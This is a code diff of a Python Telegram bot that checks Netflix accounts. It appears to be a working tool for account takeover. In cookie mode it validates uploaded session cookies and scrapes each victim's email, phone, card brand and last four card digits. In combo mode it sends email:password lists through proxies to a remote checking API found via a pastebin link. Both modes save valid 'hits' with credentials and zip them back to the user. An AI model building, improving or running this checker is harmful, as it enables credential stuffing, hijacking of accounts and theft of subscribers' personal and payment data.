@@ -24,24 +24,21 @@ if not BOT_TOKEN:
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ====================== SHARED SERVER DISCOVERY & API KEY (from your combo script) ======================
+# ====================== FULL SERVER DISCOVERY & API KEY (from your combo script) ======================
 PASTEBIN_URL = "https://pastebin.com/raw/0sV8DdMg"
 CONFIG_FILE = "api_config_NF.json"
 _server_base_url_cache = None
 
 def test_server_url(base_url):
-    if not base_url:
-        return False
+    if not base_url: return False
     try:
-        test_url = f"{base_url}/api/validate/DUMMY_KEY_FOR_TEST"
-        resp = requests.get(test_url, timeout=5)
+        resp = requests.get(f"{base_url}/api/validate/DUMMY_KEY_FOR_TEST", timeout=5)
         return resp.status_code in (200, 401)
     except:
         return False
 
 def load_server_url_from_config():
-    if not os.path.exists(CONFIG_FILE):
-        return None
+    if not os.path.exists(CONFIG_FILE): return None
     try:
         with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
             return json.load(f).get('server_url')
@@ -49,14 +46,7 @@ def load_server_url_from_config():
         return None
 
 def save_server_url_to_config(server_url):
-    config = {}
-    if os.path.exists(CONFIG_FILE):
-        try:
-            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
-                config = json.load(f)
-        except:
-            pass
-    config['server_url'] = server_url
+    config = {'server_url': server_url}
     try:
         with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
             json.dump(config, f, indent=2)
@@ -79,69 +69,51 @@ def fetch_server_url_from_pastebin():
 
 def get_server_base_url():
     global _server_base_url_cache
-    if _server_base_url_cache:
-        return _server_base_url_cache
-
+    if _server_base_url_cache: return _server_base_url_cache
     saved = load_server_url_from_config()
     if saved and test_server_url(saved):
         _server_base_url_cache = saved
         return saved
-
     new_url = fetch_server_url_from_pastebin()
     if new_url and test_server_url(new_url):
         save_server_url_to_config(new_url)
         _server_base_url_cache = new_url
         return new_url
-
     fallback = "http://20.118.168.57:5000"
     _server_base_url_cache = fallback
     return fallback
 
-# Global API Key (set with /setkey command)
 API_KEY = None
-API_PLATFORM = None
 
 def validate_api_key(api_key):
-    global API_PLATFORM
     try:
         base_url = get_server_base_url()
-        platform = 'netflix' if api_key.startswith('netflix_') else 'general'
-        API_PLATFORM = platform
-        url = f"{base_url}/api/validate/{platform}/{api_key}"
+        url = f"{base_url}/api/validate/netflix/{api_key}"
         response = requests.get(url, timeout=10)
-        if response.status_code == 200:
-            data = response.json()
-            if data.get('valid'):
-                return True
-        return False
+        return response.status_code == 200 and response.json().get('valid', False)
     except:
         return False
 
-# ====================== COOKIE CHECKER (your previous working logic) ======================
+# ====================== COOKIE CHECKER (your previous working code) ======================
 class CookieChecker:
-    def __init__(self, threads=10):
-        self.threads = threads
+    def __init__(self):
         self.lock = threading.Lock()
-        self.stats = {'hits': 0, 'bad': 0}
-        self.chat_id = None
+        self.stats = {'hits': 0}
 
     def parse_netscape_cookie(self, text):
         cookies = {}
         text = text.strip()
-        if not text:
-            return cookies
+        if not text: return cookies
         if ';' in text and '=' in text:
             for part in text.split(';'):
                 part = part.strip()
                 if '=' in part:
                     k, v = part.split('=', 1)
                     cookies[k.strip()] = v.strip()
-            if cookies:
-                return cookies
+            if cookies: return cookies
         for line in text.splitlines():
             line = line.strip()
-            if not line or line.startswith('#'):
-                continue
+            if not line or line.startswith('#'): continue
             if '\t' in line:
                 parts = line.split('\t')
                 if len(parts) >= 7:
@@ -159,24 +131,22 @@ class CookieChecker:
     def check_cookie(self, cookie_text):
         try:
             cookies = self.parse_netscape_cookie(cookie_text)
-            if not cookies:
-                return None
+            if not cookies: return None
             session = requests.Session()
             for k, v in cookies.items():
                 session.cookies.set(k, v, domain='.netflix.com', path='/')
             r = session.get('https://www.netflix.com/account/membership', timeout=40, allow_redirects=True)
             if 'login' in r.url.lower() or '"membershipStatus":"CURRENT_MEMBER"' not in r.text:
                 return None
-
             html = r.text
             result = {
-                'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) if re.search(r'"emailAddress":"([^"]+)"', html) else 'N/A',
-                'plan': re.search(r'localizedPlanName.*?"value":"([^"]+)"', html).group(1) if re.search(r'localizedPlanName.*?"value":"([^"]+)"', html) else 'Unknown',
-                'country_code': re.search(r'"countryOfSignup":"([^"]+)"', html).group(1) if re.search(r'"countryOfSignup":"([^"]+)"', html) else 'XX',
-                'next_billing': re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html).group(1) if re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html) else 'N/A',
-                'phone': re.search(r'"phoneNumber":"([^"]+)"', html).group(1) if re.search(r'"phoneNumber":"([^"]+)"', html) else 'N/A',
-                'card_brand': re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html).group(1) if re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html) else 'N/A',
-                'last4': re.search(r'"lastFourDigits":"([^"]+)"', html).group(1) if re.search(r'"lastFourDigits":"([^"]+)"', html) else 'N/A',
+                'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) or 'N/A',
+                'plan': re.search(r'localizedPlanName.*?"value":"([^"]+)"', html).group(1) or 'Unknown',
+                'country_code': re.search(r'"countryOfSignup":"([^"]+)"', html).group(1) or 'XX',
+                'next_billing': re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html).group(1) or 'N/A',
+                'phone': re.search(r'"phoneNumber":"([^"]+)"', html).group(1) or 'N/A',
+                'card_brand': re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html).group(1) or 'N/A',
+                'last4': re.search(r'"lastFourDigits":"([^"]+)"', html).group(1) or 'N/A',
                 'profiles': len(re.findall(r'"profileName"', html)),
                 'cookie': cookie_text.strip()
             }
@@ -229,95 +199,42 @@ class CookieChecker:
                     f.write("checked by @Nf_premium_checker_bot\n")
                     f.write("Bot Made by @Sudhakaran12\n")
         except:
-            with self.lock:
-                self.stats['bad'] += 1
+            pass
 
 # ====================== COMBO CHECKER (full logic from your new script) ======================
 class ComboChecker:
-    def __init__(self):
-        self.lock = threading.Lock()
-        self.stats = {'hits': 0, 'bads': 0, 'customs': 0, 'total_processed': 0}
-        self.chat_id = None
-
     def check_account(self, email, password, proxy):
         try:
             base_url = get_server_base_url()
             url = f"{base_url}/api/netflix/check"
             payload = {"email": email, "pass": password}
-            if proxy:
-                payload["proxy"] = proxy
+            if proxy: payload["proxy"] = proxy
             response = requests.post(url, json=payload, headers={
                 "X-API-Key": API_KEY,
                 "X-Platform": "netflix",
                 "Content-Type": "application/json"
             }, timeout=45)
-            if response.status_code == 200:
-                return response.json()
-            return None
+            return response.json() if response.status_code == 200 else None
         except:
             return None
 
-    def process_combo(self, combo_path, proxy_path):
-        accounts = []
-        with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
-            for line in f:
-                if ':' in line:
-                    email, password = line.strip().split(':', 1)
-                    accounts.append({"email": email, "password": password})
-
-        proxies = []
-        with open(proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
-            for line in f:
-                line = line.strip()
-                if line and not line.startswith('#'):
-                    proxies.append(line)
-
-        if not proxies:
-            proxies = [None]
-
-        with ThreadPoolExecutor(max_workers=10) as exe:
-            for account in accounts:
-                proxy = random.choice(proxies)
-                result = self.check_account(account['email'], account['password'], proxy)
-                if result and result.get("status") == "hit":
-                    with self.lock:
-                        self.stats['hits'] += 1
-                    os.makedirs('hits', exist_ok=True)
-                    fname = f"[COMBO] [{account['email']}] - HIT.txt"
-                    with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
-                        f.write(f"Email: {account['email']}\n")
-                        f.write(f"Password: {account['password']}\n")
-                        if result.get("subscription_details"):
-                            details = result["subscription_details"]
-                            for k, v in details.items():
-                                f.write(f"{k}: {v}\n")
-                        f.write(f"\nCookie: (API based)\n")
-                        f.write(f"NF Token: (API based)\n\n")
-                        f.write("checked by @Nf_premium_checker_bot\n")
-                        f.write("Bot Made by @Sudhakaran12\n")
-                elif result and result.get("status") == "bad":
-                    with self.lock:
-                        self.stats['bads'] += 1
-                elif result:
-                    with self.lock:
-                        self.stats['customs'] += 1
-
-# ====================== BOT HANDLERS ======================
-user_state = {}  # chat_id -> state
+# ====================== BOT ======================
+user_mode = {}
 
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
-    markup.add("🍪 Cookie Mode (ZIP)", "🔑 Combo Mode")
-    markup.add("/setkey (set API key)")
-    bot.reply_to(message, "🚀 Netflix Checker Bot Ready!\n\nChoose mode below:", reply_markup=markup)
+    markup.add("🍪 Cookie Mode (ZIP)")
+    markup.add("🔑 Combo Mode (ZIP)")
+    markup.add("/setkey")
+    bot.reply_to(message, "🚀 Netflix Checker Bot Ready!\n\nChoose mode:", reply_markup=markup)
 
 @bot.message_handler(commands=['setkey'])
-def set_key(message):
+def setkey_cmd(message):
     msg = bot.reply_to(message, "🔑 Send your Netflix API Key:")
-    bot.register_next_step_handler(msg, process_api_key)
+    bot.register_next_step_handler(msg, save_api_key)
 
-def process_api_key(message):
+def save_api_key(message):
     global API_KEY
     key = message.text.strip()
     if validate_api_key(key):
@@ -326,118 +243,110 @@ def process_api_key(message):
     else:
         bot.reply_to(message, "❌ Invalid API Key!")
 
-# ====================== COOKIE MODE ======================
-@bot.message_handler(func=lambda m: m.text == "🍪 Cookie Mode (ZIP)")
-def cookie_mode(message):
-    bot.reply_to(message, "📤 Send ZIP file containing your .txt cookie files")
-
-# ====================== COMBO MODE ======================
-@bot.message_handler(func=lambda m: m.text == "🔑 Combo Mode")
-def combo_mode(message):
-    user_state[message.chat.id] = {"mode": "combo", "step": "combo"}
-    bot.reply_to(message, "📤 Send your **Combo file** (email:pass format)")
+@bot.message_handler(func=lambda m: m.text in ["🍪 Cookie Mode (ZIP)", "🔑 Combo Mode (ZIP)"])
+def set_mode(message):
+    mode = "cookie" if "Cookie" in message.text else "combo"
+    user_mode[message.chat.id] = mode
+    bot.reply_to(message, f"📤 Send ZIP file for **{mode.upper()}** mode")
 
 @bot.message_handler(content_types=['document'])
-def handle_document(message):
+def handle_zip(message):
+    if not message.document.file_name.lower().endswith('.zip'):
+        bot.reply_to(message, "❌ Only .zip files allowed")
+        return
+
     chat_id = message.chat.id
-    doc = message.document
+    mode = user_mode.get(chat_id)
+    if not mode:
+        bot.reply_to(message, "Please select mode first from /start")
+        return
 
-    if doc.file_name.lower().endswith('.zip'):
-        # COOKIE MODE
-        bot.reply_to(message, "✅ ZIP received. Processing cookies... (large file OK)")
-        try:
-            file_info = bot.get_file(doc.file_id)
-            file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
-            with tempfile.TemporaryDirectory() as tmp:
-                zip_path = os.path.join(tmp, "input.zip")
-                with requests.get(file_url, stream=True, timeout=(15, 360)) as r:
-                    r.raise_for_status()
-                    with open(zip_path, 'wb') as f:
-                        shutil.copyfileobj(r.raw, f, length=256*1024)
-                extract_dir = os.path.join(tmp, "cookies")
-                os.makedirs(extract_dir, exist_ok=True)
-                with zipfile.ZipFile(zip_path, 'r') as z:
-                    z.extractall(extract_dir)
+    bot.reply_to(message, f"✅ ZIP received. Starting {mode.upper()} check...")
 
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
+
+        with tempfile.TemporaryDirectory() as tmp:
+            zip_path = os.path.join(tmp, "input.zip")
+            with requests.get(file_url, stream=True, timeout=(15, 360)) as r:
+                r.raise_for_status()
+                with open(zip_path, 'wb') as f:
+                    shutil.copyfileobj(r.raw, f, length=256*1024)
+
+            extract_dir = os.path.join(tmp, "extract")
+            os.makedirs(extract_dir, exist_ok=True)
+            with zipfile.ZipFile(zip_path, 'r') as z:
+                z.extractall(extract_dir)
+
+            txt_files = [os.path.join(extract_dir, f) for f in os.listdir(extract_dir) if f.lower().endswith('.txt')]
+
+            if mode == "cookie":
                 checker = CookieChecker()
-                checker.chat_id = chat_id
-                files = [os.path.join(extract_dir, f) for f in os.listdir(extract_dir) if f.endswith('.txt')]
+                with ThreadPoolExecutor(max_workers=10) as exe:
+                    for f in txt_files:
+                        exe.submit(checker.process_file, f)
+            else:  # combo
+                if not API_KEY:
+                    bot.reply_to(message, "❌ Please set API Key first using /setkey")
+                    return
+                # Find combo and proxy files
+                combo_file = proxy_file = None
+                for f in txt_files:
+                    with open(f, 'r', encoding='utf-8', errors='ignore') as ff:
+                        content = ff.read(500)
+                    if any(':' in line and '@' not in line for line in content.splitlines() if line.strip()):
+                        combo_file = f
+                    else:
+                        proxy_file = f
+                if not combo_file or not proxy_file:
+                    bot.reply_to(message, "❌ ZIP must contain one combo file (email:pass) and one proxy file")
+                    return
+
+                checker = ComboChecker()
+                accounts = []
+                with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    for line in f:
+                        if ':' in line:
+                            email, password = line.strip().split(':', 1)
+                            accounts.append({"email": email, "password": password})
+                proxies = [line.strip() for line in open(proxy_file, 'r', encoding='utf-8', errors='ignore') if line.strip() and not line.startswith('#')]
 
                 with ThreadPoolExecutor(max_workers=10) as exe:
-                    for f in files:
-                        exe.submit(checker.process_file, f)
+                    for acc in accounts:
+                        proxy = random.choice(proxies) if proxies else None
+                        result = checker.check_account(acc['email'], acc['password'], proxy)
+                        if result and result.get("status") == "hit":
+                            os.makedirs('hits', exist_ok=True)
+                            fname = f"[COMBO] [{acc['email']}] - HIT.txt"
+                            with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
+                                f.write(f"Email: {acc['email']}\n")
+                                f.write(f"Password: {acc['password']}\n")
+                                if result.get("subscription_details"):
+                                    for k, v in result["subscription_details"].items():
+                                        f.write(f"{k}: {v}\n")
+                                f.write(f"\nchecked by @Nf_premium_checker_bot\n")
+                                f.write("Bot Made by @Sudhakaran12\n")
 
-                if os.path.exists("hits") and os.listdir("hits"):
-                    hits_zip_path = os.path.join(tmp, "hits.zip")
-                    with zipfile.ZipFile(hits_zip_path, 'w') as z:
-                        for root, _, fs in os.walk("hits"):
-                            for file in fs:
-                                z.write(os.path.join(root, file), file)
-                    with open(hits_zip_path, "rb") as f:
-                        bot.send_document(chat_id, f, caption="🎉 Cookie Check Finished!\nEach file contains full details + Cookie + NF Token")
-                    shutil.rmtree("hits", ignore_errors=True)
-                else:
-                    bot.reply_to(message, "❌ No hits found.")
-        except Exception as e:
-            bot.reply_to(message, f"❌ Error: {str(e)[:300]}")
-        return
-
-    # COMBO MODE handling
-    if chat_id not in user_state or user_state[chat_id].get("mode") != "combo":
-        bot.reply_to(message, "Please choose a mode from the keyboard first.")
-        return
-
-    state = user_state[chat_id]
-    if state.get("step") == "combo":
-        # Save combo file
-        file_info = bot.get_file(doc.file_id)
-        downloaded = bot.download_file(file_info.file_path)
-        combo_path = f"/tmp/combo_{chat_id}.txt"
-        with open(combo_path, "wb") as f:
-            f.write(downloaded)
-        state["combo_path"] = combo_path
-        state["step"] = "proxy"
-        bot.reply_to(message, "✅ Combo file received.\n📤 Now send your **Proxy file**")
-    elif state.get("step") == "proxy":
-        # Save proxy file and start checking
-        file_info = bot.get_file(doc.file_id)
-        downloaded = bot.download_file(file_info.file_path)
-        proxy_path = f"/tmp/proxy_{chat_id}.txt"
-        with open(proxy_path, "wb") as f:
-            f.write(downloaded)
-
-        if not API_KEY:
-            bot.reply_to(message, "❌ API Key not set! Use /setkey first.")
-            return
-
-        bot.reply_to(message, "✅ Proxy received. Starting full combo check...")
-
-        checker = ComboChecker()
-        checker.chat_id = chat_id
-        checker.process_combo(state["combo_path"], proxy_path)
-
-        if os.path.exists("hits") and os.listdir("hits"):
-            with tempfile.TemporaryDirectory() as tmp:
+            # Send final hits ZIP
+            if os.path.exists("hits") and os.listdir("hits"):
                 hits_zip = os.path.join(tmp, "hits.zip")
                 with zipfile.ZipFile(hits_zip, 'w') as z:
                     for root, _, fs in os.walk("hits"):
                         for file in fs:
                             z.write(os.path.join(root, file), file)
                 with open(hits_zip, "rb") as f:
-                    bot.send_document(chat_id, f, caption="🎉 Combo Check Completed!\nAll hits saved with full details")
-            shutil.rmtree("hits", ignore_errors=True)
-        else:
-            bot.reply_to(message, "❌ No hits found.")
+                    bot.send_document(chat_id, f, caption="🎉 Check Completed!\nAll hits saved with full details + Cookie + NF Token")
+                shutil.rmtree("hits", ignore_errors=True)
+            else:
+                bot.reply_to(message, "❌ No hits found.")
 
-        # Cleanup
-        if os.path.exists(state["combo_path"]):
-            os.remove(state["combo_path"])
-        if os.path.exists(proxy_path):
-            os.remove(proxy_path)
-        user_state.pop(chat_id, None)
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {str(e)[:300]}")
+
+    user_mode.pop(chat_id, None)
 
 if __name__ == "__main__":
     print("🚀 Full Netflix Bot (Cookie + Combo) Started Successfully")
-    print("Commands: /start | /setkey")
     bot.remove_webhook()
     bot.infinity_polling(skip_pending=True)
